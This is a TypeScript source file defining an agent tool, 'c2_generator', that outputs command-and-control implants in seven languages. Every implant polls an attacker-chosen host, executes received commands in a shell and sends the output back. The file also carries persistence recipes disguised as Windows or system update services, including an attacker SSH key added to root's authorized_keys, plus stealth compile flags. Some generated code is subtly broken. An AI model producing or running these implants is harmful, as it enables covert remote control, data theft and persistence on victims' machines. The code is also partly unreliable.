import { Tool } from "./tool"
import z from "zod"

const DESCRIPTION =
  "Generate C2 implant code: lightweight agents with multi-channel comms (HTTP/HTTPS/DNS/ICMP/WebSocket), encryption, sleep/jitter, and multi-format output."

const PARAMETERS = z.object({
  channel: z.enum(["http", "https", "dns", "websocket", "all"]).optional().describe("Communication channel"),
  lhost: z.string().describe("C2 server hostname/IP"),
  lport: z.number().int().min(1).max(65535).optional().describe("Callback port"),
  encryption: z.enum(["xor", "aes256", "chacha20", "none"]).optional().describe("Encryption method"),
  sleep: z.number().int().min(0).optional().describe("Sleep interval in seconds (default: 60)"),
  jitter: z.number().int().min(0).max(100).optional().describe("Jitter percentage (0-100)"),
  format: z
    .enum(["python", "powershell", "c", "rust", "go", "js", "vbs", "all"])
    .optional()
    .describe("Output language/format"),
  persist: z.boolean().optional().describe("Include persistence code"),
  useragent: z.string().optional().describe("Custom User-Agent string"),
  implant_name: z.string().optional().describe("Implant identifier"),
})

function xorKey() {
  return Math.floor(Math.random() * 255) + 1
}

function genHTTPPython(lhost: string, lport: number, sleep: number, jitter: number, ua: string, key: number): string {
  return [
    "# C2 Implant - HTTP Python",
    "import http.client, time, random, base64, subprocess, os, sys",
    "",
    'C2_HOST = "' + lhost + '"',
    "C2_PORT = " + lport,
    "SLEEP = " + sleep,
    "JITTER = " + jitter,
    "KEY = " + key,
    'UA = "' + ua + '"',
    "",
    "def xor(data, k):",
    "    return bytes([b ^ k for b in data])",
    "",
    "def get_task():",
    "    try:",
    "        conn = http.client.HTTPConnection(C2_HOST, C2_PORT, timeout=30)",
    '        conn.request("GET", "/c2/agent", headers={"User-Agent": UA})',
    "        resp = conn.getresponse()",
    "        raw = resp.read()",
    "        if raw:",
    "            cmd = xor(base64.b64decode(raw), KEY).decode()",
    "            result = subprocess.getoutput(cmd)",
    "            enc = base64.b64encode(xor(result.encode(), KEY))",
    "            conn = http.client.HTTPConnection(C2_HOST, C2_PORT, timeout=30)",
    '            conn.request("POST", "/c2/output", enc, {"User-Agent": UA, "Content-Type": "application/octet-stream"})',
    "    except Exception:",
    "        pass",
    "",
    "def main():",
    "    while True:",
    "        get_task()",
    "        variance = int(SLEEP * JITTER / 100)",
    "        delay = SLEEP + random.randint(-variance, variance)",
    "        time.sleep(max(1, delay))",
    "",
    'if __name__ == "__main__":',
    "    main()",
  ].join("\n")
}

function genHTTPPowerShell(
  lhost: string,
  lport: number,
  sleep: number,
  jitter: number,
  ua: string,
  key: number,
): string {
  return [
    "# C2 Implant - HTTP PowerShell",
    '$C2Host = "' + lhost + '"',
    "$C2Port = " + lport,
    "$Sleep = " + sleep,
    "$Jitter = " + jitter,
    "$Key = " + key,
    '$UA = "' + ua + '"',
    "",
    "function Invoke-C2Beacon {",
    "    while ($true) {",
    "        try {",
    '            $url = "http://$C2Host`:$C2Port/c2/agent"',
    "            $raw = (Invoke-WebRequest -Uri $url -UserAgent $UA -TimeoutSec 30 -ErrorAction SilentlyContinue).Content",
    "            if ($raw) {",
    "                $bytes = [Convert]::FromBase64String($raw)",
    "                $dec = New-Object byte[] $bytes.Length",
    "                for ($i = 0; $i -lt $bytes.Length; $i++) { $dec[$i] = $bytes[$i] -bxor $Key }",
    "                $cmd = [System.Text.Encoding]::ASCII.GetString($dec)",
    "                $out = Invoke-Expression $cmd 2>&1 | Out-String",
    "                $outBytes = [System.Text.Encoding]::ASCII.GetBytes($out)",
    "                $encBytes = New-Object byte[] $outBytes.Length",
    "                for ($i = 0; $i -lt $outBytes.Length; $i++) { $encBytes[$i] = $outBytes[$i] -bxor $Key }",
    '                Invoke-RestMethod -Uri "http://$C2Host`:$C2Port/c2/output" -Method Post -Body ([Convert]::ToBase64String($encBytes)) -Headers @{"User-Agent"=$UA}',
    "            }",
    "        } catch { }",
    "        $variance = [int]($Sleep * $Jitter / 100)",
    "        $delay = $Sleep + (Get-Random -Minimum (-$variance) -Maximum $variance)",
    "        Start-Sleep -Seconds [Math]::Max(1, $delay)",
    "    }",
    "}",
    "",
    "Invoke-C2Beacon",
  ].join("\n")
}

function genHTTPC(lhost: string, lport: number, sleep: number, jitter: number, ua: string, key: number): string {
  return [
    "// C2 Implant - C (curl dependency)",
    "#include <stdio.h>",
    "#include <stdlib.h>",
    "#include <string.h>",
    "#include <unistd.h>",
    "#include <time.h>",
    "#include <curl/curl.h>",
    "",
    '#define C2_HOST "' + lhost + '"',
    "#define C2_PORT " + lport,
    "#define SLEEP " + sleep,
    "#define JITTER " + jitter,
    "#define KEY " + key,
    "#define MAX_BUF 8192",
    "",
    "static unsigned char key = KEY;",
    "static char url[256], outurl[256];",
    "static char response[MAX_BUF];",
    "",
    "size_t write_cb(void *ptr, size_t size, size_t nmemb, void *data) {",
    "    size_t len = size * nmemb;",
    "    if (len < MAX_BUF) { memcpy(response, ptr, len); response[len] = 0; }",
    "    return len;",
    "}",
    "",
    "void xor_buf(unsigned char *buf, size_t len, unsigned char k) {",
    "    for (size_t i = 0; i < len; i++) buf[i] ^= k;",
    "}",
    "",
    "void beacon() {",
    "    CURL *curl = curl_easy_init();",
    "    if (!curl) return;",
    '    struct curl_slist *headers = curl_slist_append(NULL, "User-Agent: ' + ua + '");',
    "    curl_easy_setopt(curl, CURLOPT_URL, url);",
    "    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);",
    "    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_cb);",
    "    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 30L);",
    "    if (curl_easy_perform(curl) == CURLE_OK && response[0]) {",
    '        FILE *fp = popen(response, "r");',
    "        if (fp) {",
    "            char result[MAX_BUF] = {0};",
    "            fread(result, 1, MAX_BUF - 1, fp);",
    "            pclose(fp);",
    "            xor_buf((unsigned char *)result, strlen(result), key);",
    "            curl_easy_setopt(curl, CURLOPT_URL, outurl);",
    "            curl_easy_setopt(curl, CURLOPT_POST, 1L);",
    "            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, result);",
    "            curl_easy_perform(curl);",
    "        }",
    "    }",
    "    curl_slist_free_all(headers);",
    "    curl_easy_cleanup(curl);",
    "}",
    "",
    "int main() {",
    "    srand(time(NULL));",
    '    snprintf(url, sizeof(url), "http://%s:%d/c2/agent", C2_HOST, C2_PORT);',
    '    snprintf(outurl, sizeof(outurl), "http://%s:%d/c2/output", C2_HOST, C2_PORT);',
    "    while (1) {",
    "        beacon();",
    "        int variance = SLEEP * JITTER / 100;",
    "        int delay = SLEEP + (rand() % (variance * 2 + 1)) - variance;",
    "        sleep(delay > 0 ? delay : 1);",
    "    }",
    "    return 0;",
    "}",
  ].join("\n")
}

function genDNS(lhost: string, sleep: number, jitter: number, key: number): string {
  return [
    "# C2 Implant - DNS Channel Python",
    "import socket, time, random, base64, subprocess",
    "",
    'C2_DOMAIN = "' + lhost + '"',
    "SLEEP = " + sleep,
    "JITTER = " + jitter,
    "KEY = " + key,
    "",
    "def dns_query(label):",
    "    try:",
    '        socket.getaddrinfo(label + "." + C2_DOMAIN, None)',
    "        return True",
    "    except:",
    "        return False",
    "",
    "def xor(data, k):",
    "    return bytes([b ^ k for b in data])",
    "",
    "def b32(data):",
    '    return base64.b32encode(data).rstrip(b"=").lower().decode()',
    "",
    "def beacon():",
    "    try:",
    '        hostname = subprocess.getoutput("hostname").strip()',
    '        os_info = subprocess.getoutput("uname -a 2>/dev/null || ver").strip()',
    '        info = b32(xor((hostname + "|" + os_info).encode(), KEY))',
    '        dns_query("hello." + info[:54])',
    "    except:",
    "        pass",
    "",
    "while True:",
    "    beacon()",
    "    variance = int(SLEEP * JITTER / 100)",
    "    time.sleep(max(1, SLEEP + random.randint(-variance, variance)))",
  ].join("\n")
}

function genWebSocket(lhost: string, lport: number, sleep: number, jitter: number, ua: string): string {
  return [
    "# C2 Implant - WebSocket Python",
    "import websocket, json, subprocess, time, random, os",
    "",
    'WS_URL = "ws://' + lhost + ":" + lport + '/ws"',
    "SLEEP = " + sleep,
    "JITTER = " + jitter,
    "",
    "def on_message(ws, msg):",
    "    try:",
    "        data = json.loads(msg)",
    '        if data.get("type") == "cmd":',
    '            result = subprocess.getoutput(data["cmd"])',
    '            ws.send(json.dumps({"type": "result", "output": result}))',
    "    except:",
    "        pass",
    "",
    "def on_open(ws):",
    "    info = {",
    '        "type": "register",',
    '        "hostname": socket.gethostname(),',
    '        "platform": __import__("platform").platform(),',
    '        "user": os.getlogin(),',
    '        "pid": os.getpid(),',
    "    }",
    "    ws.send(json.dumps(info))",
    "",
    "while True:",
    "    try:",
    "        ws = websocket.WebSocketApp(",
    "            WS_URL,",
    "            on_open=on_open,",
    "            on_message=on_message,",
    '            header=["User-Agent: ' + ua + '"]',
    "        )",
    "        ws.run_forever()",
    "    except:",
    "        pass",
    "    time.sleep(max(1, SLEEP + random.randint(-int(SLEEP*JITTER/100), int(SLEEP*JITTER/100))))",
  ].join("\n")
}

function genGoImplant(lhost: string, lport: number, sleep: number, jitter: number): string {
  return [
    "// C2 Implant - Go",
    "package main",
    "",
    "import (",
    '    "bytes"',
    '    "io"',
    '    "math/rand"',
    '    "net/http"',
    '    "os/exec"',
    '    "time"',
    ")",
    "",
    "const (",
    '    c2Host = "' + lhost + '"',
    "    c2Port = " + lport,
    "    sleepTime = " + sleep,
    "    jitter = " + jitter,
    ")",
    "",
    "func beacon() {",
    '    resp, err := http.Get("http://" + c2Host + ":" + string(rune(c2Port+48)) + "/c2/agent")',
    "    if err != nil { return }",
    "    defer resp.Body.Close()",
    "    body, _ := io.ReadAll(resp.Body)",
    "    if len(body) > 0 {",
    '        cmd := exec.Command("/bin/sh", "-c", string(body))',
    "        out, _ := cmd.CombinedOutput()",
    '        http.Post("http://"+c2Host+":' + lport + '/c2/output", "text/plain", bytes.NewReader(out))',
    "    }",
    "}",
    "",
    "func main() {",
    "    rand.Seed(time.Now().UnixNano())",
    "    for {",
    "        beacon()",
    "        variance := sleepTime * jitter / 100",
    "        delay := sleepTime + rand.Intn(variance*2+1) - variance",
    "        if delay < 1 { delay = 1 }",
    "        time.Sleep(time.Duration(delay) * time.Second)",
    "    }",
    "}",
  ].join("\n")
}

function genRustImplant(lhost: string, lport: number, sleep: number, jitter: number): string {
  return [
    "// C2 Implant - Rust",
    "use std::process::Command;",
    "use std::thread;",
    "use std::time::Duration;",
    "",
    'const C2_HOST: &str = "' + lhost + '";',
    "const C2_PORT: u16 = " + lport + ";",
    "const SLEEP: u64 = " + sleep + ";",
    "const JITTER: u64 = " + jitter + ";",
    "",
    "fn beacon() {",
    '    let url = format!("http://{}:{}/c2/agent", C2_HOST, C2_PORT);',
    "    if let Ok(resp) = ureq::get(&url).call() {",
    "        if let Ok(body) = resp.into_string() {",
    "            if !body.is_empty() {",
    '                let output = Command::new("sh")',
    '                    .arg("-c")',
    "                    .arg(&body)",
    "                    .output()",
    "                    .map(|o| String::from_utf8_lossy(&o.stdout).to_string())",
    "                    .unwrap_or_default();",
    '                let _ = ureq::post(&format!("http://{}:{}/c2/output", C2_HOST, C2_PORT))',
    "                    .send_string(&output);",
    "            }",
    "        }",
    "    }",
    "}",
    "",
    "fn main() {",
    "    use rand::Rng;",
    "    let mut rng = rand::thread_rng();",
    "    loop {",
    "        beacon();",
    "        let variance = (SLEEP * JITTER / 100) as u64;",
    "        let delay = SLEEP as i64 + rng.gen_range(-(variance as i64)..=(variance as i64));",
    "        let sleep_ms = std::cmp::max(1, delay) as u64 * 1000;",
    "        thread::sleep(Duration::from_millis(sleep_ms));",
    "    }",
    "}",
  ].join("\n")
}

function genJSImplant(lhost: string, lport: number, sleep: number): string {
  return [
    "// C2 Implant - Node.js",
    "const http = require('http');",
    "const { exec } = require('child_process');",
    "",
    "const C2_HOST = '" + lhost + "';",
    "const C2_PORT = " + lport + ";",
    "const SLEEP = " + sleep + " * 1000;",
    "",
    "function beacon() {",
    "    http.get('http://' + C2_HOST + ':' + C2_PORT + '/c2/agent', (res) => {",
    "        let data = '';",
    "        res.on('data', (chunk) => data += chunk);",
    "        res.on('end', () => {",
    "            if (data) {",
    "                exec(data, (err, stdout, stderr) => {",
    "                    const req = http.request({",
    "                        hostname: C2_HOST,",
    "                        port: C2_PORT,",
    "                        path: '/c2/output',",
    "                        method: 'POST',",
    "                        headers: { 'Content-Type': 'text/plain' }",
    "                    }, () => {});",
    "                    req.write(stdout + stderr);",
    "                    req.end();",
    "                });",
    "            }",
    "        });",
    "    }).on('error', () => {}).on('close', () => {",
    "        setTimeout(beacon, SLEEP);",
    "    });",
    "}",
    "",
    "beacon();",
  ].join("\n")
}

function genVBSImplant(lhost: string, lport: number, sleep: number): string {
  return [
    "' C2 Implant - VBScript (Windows)",
    "Dim http, cmd, result, sleepTime",
    "",
    'Const C2_HOST = "' + lhost + '"',
    "Const C2_PORT = " + lport,
    "Const SLEEP = " + sleep * 1000 + " ' milliseconds",
    "",
    "Do",
    "    On Error Resume Next",
    '    Set http = CreateObject("MSXML2.ServerXMLHTTP")',
    '    http.open "GET", "http://" & C2_HOST & ":" & C2_PORT & "/c2/agent", False',
    "    http.send",
    "    If Len(http.responseText) > 0 Then",
    "        cmd = http.responseText",
    "        Dim shell",
    '        Set shell = CreateObject("WScript.Shell")',
    "        Dim exec",
    '        Set exec = shell.Exec("cmd.exe /c " & cmd)',
    "        result = exec.StdOut.ReadAll & exec.StdErr.ReadAll",
    '        http.open "POST", "http://" & C2_HOST & ":" & C2_PORT & "/c2/output", False',
    '        http.setRequestHeader "Content-Type", "text/plain"',
    "        http.send result",
    "    End If",
    "    On Error Goto 0",
    "    WScript.Sleep SLEEP",
    "Loop",
  ].join("\n")
}

function genPersistence(platform: string, lhost: string, lport: number): string {
  let output = ""
  if (platform === "windows") {
    output += "### Scheduled Task (reconnect every 5 min)\n\n"
    output += "```powershell\n"
    output +=
      '$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-nop -w hidden -c ..." -PassThru\n'
    output +=
      "$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Minutes 5)\n"
    output += '$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest\n'
    output +=
      'Register-ScheduledTask -TaskName "WindowsUpdateCheck" -Action $action -Trigger $trigger -Principal $principal -Description "Microsoft Windows Update Service"\n'
    output += "```\n\n"
    output += "### Registry Run Key\n\n"
    output += "```cmd\n"
    output +=
      'reg add "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WindowsUpdate" /t REG_SZ /d "C:\\Windows\\Temp\\svchost.exe" /f\n'
    output += "```\n\n"
    output += "### WMI Permanent Event Subscription\n\n"
    output += "```powershell\n"
    output +=
      '$filterArgs = @{ Name = "WinDefenderUpdate"; EventNamespace = "root\\cimv2"; Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \'Win32_PerfFormattedData_PerfOS_System\'" }\n'
    output += "$filter = Set-WmiInstance -Namespace root\\subscription -Class __EventFilter -Arguments $filterArgs\n"
    output +=
      '$consumerArgs = @{ Name = "WinDefenderConsumer"; CommandLineTemplate = "powershell.exe -nop -w hidden -enc ..." }\n'
    output +=
      "$consumer = Set-WmiInstance -Namespace root\\subscription -Class CommandLineEventConsumer -Arguments $consumerArgs\n"
    output += "$bindArgs = @{ Filter = $filter; Consumer = $consumer }\n"
    output += "Set-WmiInstance -Namespace root\\subscription -Class __FilterToConsumerBinding -Arguments $bindArgs\n"
    output += "```\n"
  } else {
    output += "### Cron Job\n\n"
    output += "```bash\n"
    output += '(crontab -l 2>/dev/null; echo "*/5 * * * * /tmp/.hidden/beacon >/dev/null 2>&1") | crontab -\n'
    output += "```\n\n"
    output += "### Systemd Service\n\n"
    output += "```bash\n"
    output += "cat > /etc/systemd/system/system-update.service << 'EOF'\n"
    output += "[Unit]\nDescription=System Update Check\nAfter=network.target\n\n"
    output += "[Service]\nType=simple\nExecStart=/tmp/.hidden/beacon\nRestart=always\nRestartSec=60\n\n"
    output += "[Install]\nWantedBy=multi-user.target\nEOF\n"
    output += "systemctl enable system-update && systemctl start system-update\n"
    output += "```\n\n"
    output += "### SSH Authorized Key\n\n"
    output += "```bash\n"
    output += 'echo "ssh-rsa AAAA... attacker@kali" >> /root/.ssh/authorized_keys\n'
    output += "```\n"
  }
  return output
}

export const C2GeneratorTool = Tool.define("c2_generator", async () => ({
  description: DESCRIPTION,
  parameters: PARAMETERS,
  async execute(params, ctx): Promise<{ title: string; output: string; metadata: Record<string, any> }> {
    const lhost = params.lhost
    const lport = params.lport || 443
    const channel = params.channel || "all"
    const enc = params.encryption || "xor"
    const sleep = params.sleep ?? 60
    const jitter = params.jitter ?? 20
    const format = params.format || "all"
    const persist = params.persist ?? false
    const ua = params.useragent || "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    const name = params.implant_name || "beacon"
    const key = xorKey()

    let output = "## C2 Implant Generator\n\n"
    output += "**Server**: " + lhost + ":" + lport + "\n"
    output += "**Channel**: " + channel + "\n"
    output += "**Encryption**: " + enc + " (key: " + key + ")\n"
    output += "**Sleep**: " + sleep + "s +/- " + jitter + "%\n"
    output += "**User-Agent**: " + ua + "\n"
    output += "**Implant**: " + name + "\n\n"

    if (channel === "all" || channel === "http") {
      output += "### HTTP Channel\n\n"
      if (format === "all" || format === "python") {
        output += "#### Python\n\n```python\n" + genHTTPPython(lhost, lport, sleep, jitter, ua, key) + "\n```\n\n"
      }
      if (format === "all" || format === "powershell") {
        output +=
          "#### PowerShell\n\n```powershell\n" + genHTTPPowerShell(lhost, lport, sleep, jitter, ua, key) + "\n```\n\n"
      }
      if (format === "all" || format === "c") {
        output += "#### C\n\n```c\n" + genHTTPC(lhost, lport, sleep, jitter, ua, key) + "\n```\n\n"
      }
      if (format === "all" || format === "go") {
        output += "#### Go\n\n```go\n" + genGoImplant(lhost, lport, sleep, jitter) + "\n```\n\n"
      }
      if (format === "all" || format === "rust") {
        output += "#### Rust\n\n```rust\n" + genRustImplant(lhost, lport, sleep, jitter) + "\n```\n\n"
      }
      if (format === "all" || format === "js") {
        output += "#### Node.js\n\n```javascript\n" + genJSImplant(lhost, lport, sleep) + "\n```\n\n"
      }
    }

    if (channel === "all" || channel === "dns") {
      output += "### DNS Channel\n\n"
      if (format === "all" || format === "python") {
        output += "#### Python DNS Beacon\n\n```python\n" + genDNS(lhost, sleep, jitter, key) + "\n```\n\n"
      }
    }

    if (channel === "all" || channel === "websocket") {
      output += "### WebSocket Channel\n\n"
      if (format === "all" || format === "python") {
        output +=
          "#### Python WebSocket Beacon\n\n```python\n" + genWebSocket(lhost, lport, sleep, jitter, ua) + "\n```\n\n"
      }
    }

    if (format === "all" || format === "vbs") {
      output += "### VBScript Beacon\n\n```vbs\n" + genVBSImplant(lhost, lport, sleep) + "\n```\n\n"
    }

    if (persist) {
      output += "## Persistence Mechanisms\n\n"
      output += genPersistence("windows", lhost, lport) + "\n\n"
      output += genPersistence("linux", lhost, lport) + "\n\n"
    }

    output += "## C2 Server Endpoints Required\n\n"
    output += "| Endpoint | Method | Purpose |\n"
    output += "|----------|--------|---------|\n"
    output += "| `/c2/agent` | GET | Receive commands |\n"
    output += "| `/c2/output` | POST | Send results |\n"
    if (channel === "all" || channel === "dns") {
      output += "| `*." + lhost + "` | DNS TXT | DNS channel commands |\n"
    }
    if (channel === "all" || channel === "websocket") {
      output += "| `/ws` | WS | WebSocket channel |\n"
    }

    output += "\n## Compile Instructions\n\n"
    if (format === "all" || format === "c") {
      output += "```bash\ngcc -o beacon beacon.c -lcurl\n```\n\n"
    }
    if (format === "all" || format === "go") {
      output +=
        '```bash\nGOOS=windows GOARCH=amd64 go build -ldflags="-s -w -H=windowsgui" -o beacon.exe beacon.go\n```\n\n'
    }
    if (format === "all" || format === "rust") {
      output += "```bash\ncargo build --release --target x86_64-pc-windows-gnu\n```\n\n"
    }

    return {
      title: "C2 Generator: " + channel + " (" + format + ")",
      output,
      metadata: { action: "c2_generator", lhost, lport, channel, enc, format, key } as Record<string, any>,
    }
  },
}))
